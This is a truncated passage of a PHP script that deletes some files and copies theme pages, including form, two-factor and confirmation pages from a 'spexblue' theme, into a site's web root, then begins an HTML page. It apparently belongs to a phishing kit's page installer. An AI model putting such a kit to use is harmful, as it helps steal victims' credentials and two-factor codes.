...
unlink($DeleteFıles4);
unlink($DeleteFıles5);
copy("../../app/theme/spexblue/home.php","../../home.php");
copy("../../app/theme/spexblue/form.php","../../form.php");
copy("../../app/theme/spexblue/form2.php","../../form2.php");
copy("../../app/theme/spexblue/twofactor.php","../../twofactor.php");
copy("../../app/theme/spexblue/confirmed.php","../../confirmed.php");
?>
<!DOCTYPE html>
<html lang="en" >
<head>
